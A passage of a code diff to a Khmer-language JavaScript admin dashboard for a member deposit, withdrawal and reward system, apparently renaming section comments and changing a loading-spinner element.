'<span class="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full w-5 h-5 flex items-center justify-center">' + deposits.length + '</span>' : '') + '\n                </div>\n                <div class="bg-white rounded-2xl shadow p-4 card-hover relative">\n                    <p class="text-gray-400 text-sm">សំណើដក</p>\n                    <p class="text-2xl font-bold text-purple-600">' + withdraws.length + '</p>\n                    ' + (withdraws.length > 0 ? '<span class="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full w-5 h-5 flex items-center justify-center">' + withdraws.length + '</span>' : '') + '\n                </div>\n            </div>\n\n            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">\n                <button onclick="renderPage(\'adminDeposit\')" class="btn-success text-white font-semibold py-4 rounded-2xl shadow transition flex items-center justify-center gap-2 relative btn-with-badge">\n                    <i class="fas fa-plus-circle"></i> អនុម័តបញ្ចូល\n                    ' + (deposits.length > 0 ? '<span class="notification-badge">' + deposits.length + '</span>' : '') + '\n                </button>\n                <button onclick="renderPage(\'adminWithdraw\')" class="btn-purple text-white font-semibold py-4 rounded-2xl shadow transition flex items-center justify-center gap-2 relative btn-with-badge">\n                    <i class="fas fa-arrow-right"></i> អនុម័តដក\n                    ' + (withdraws.length > 0 ? '<span class="notification-badge">' + withdraws.length + '</span>' : '') + '\n                </button>\n            </div>\n\n            <div class="reward-box scrollable-box mb-4">\n                <h4 class="font-semibold text-gray-700"><i class="fas fa-clock text-yellow-600 mr-2"></i>ប្រវត្តិផ្ដល់ប្រាក់រង្វាន់ថ្មីៗ</h4>\n                ' + (rewardsHistory.length === 0 ? '<p class="text-sm text-gray-500 mt-2">មិនទាន់មានការផ្ដល់ប្រាក់រង្វាន់ទេ</p>' :
                     rewardsHistory.map(function(r) {
                         var member = DB.getUsers().find(function(u) { return u.phone === r.phone; });
                         return '\n                            <div class="flex justify-between items-center border-b border-yellow-200 py-2 text-sm">\n                                <span>' + (member ? member.name : r.phone) + ' (ID: ' + (member ? member.memberId : 'N/A') + ')</span>\n                                <span class="text-yellow-600">➕ ' + formatMoney(r.amount) + '</span>\n                                <span class="text-xs text-gray-400">' + r.date + '</span>\n                            </div>\n                        ';
@@ -1534,7 +1530,7 @@
         };
 
         // ============================================================
-        //  17. PAGE: ADMIN DEPOSIT APPROVAL (WITH NOTIFICATION)
+        //  17. PAGE: ADMIN DEPOSIT APPROVAL
         // ============================================================
         function renderAdminDeposit(container, user) {
             if (!user || user.role !== 'admin') { renderPage('login'); return; }
@@ -1548,7 +1544,7 @@
         }
 
         // ============================================================
-        //  18. PAGE: ADMIN WITHDRAW APPROVAL (WITH NOTIFICATION)
+        //  18. PAGE: ADMIN WITHDRAW APPROVAL
         // ============================================================
         function renderAdminWithdraw(container, user) {
             if (!user || user.role !== 'admin') { renderPage('login'); return; }
@@ -1583,7 +1579,7 @@
         }
 
         // ============================================================
-        //  20. PAGE: ADMIN REWARD (WITH NOTIFICATION)
+        //  20. PAGE: ADMIN REWARD
         // ============================================================
         function renderAdminReward(container, user) {
             if (!user || user.role !== 'admin') { renderPage('login'); return; }
@@ -1611,7 +1607,7 @@
                 e.preventDefault();
                 var btn = document.getElementById('rewardSubmitBtn');
                 btn.disabled = true;
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> កំពុងផ្ញើ...';
+                btn.innerHTML = '<span class="spinner"></span> កំពុងផ្ញើ...';
 
                 var phone = document.getElementById('rewardMember').value;
                 var amount = parseInt(document.getElementById('rewardAmount').value.trim());
@@ -1670,7 +1666,7 @@
         }
 
         // ============================================================
-        //  21. PAGE: ADMIN INCOME (WITH NOTIFICATION)
+        //  21. PAGE: ADMIN INCOME
         // ============================================================
         function renderAdminIncome(container, user) {
             if (!user || user.role !== 'admin') { renderPage('login'); return; }
@@ -1698,7 +1694,7 @@
                 e.preventDefault();
                 var btn = document.getElementById('incomeSubmitBtn');
                 btn.disabled = true;
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> កំពុងផ្ញើ...';
+                btn.innerHTML = '<span class="spinner"></span> កំពុងផ្ញើ...';
 
                 var phone = document.getElementById('incomeMember').value;
                 var amount = parseInt(document.getElementById('incomeAmount').value.trim());
@@ -1745,7 +1741,7 @@
         }
 
         // ============================================================
-        //  22. ADMIN ACTIONS - Approve/Reject (WITH MEMBER NOTIFICATION)
+        //  22. ADMIN ACTIONS - Approve/Reject
         // ============================================================
         window.approveDeposit = async function(id) {
             var deposits = DB.getDeposits();
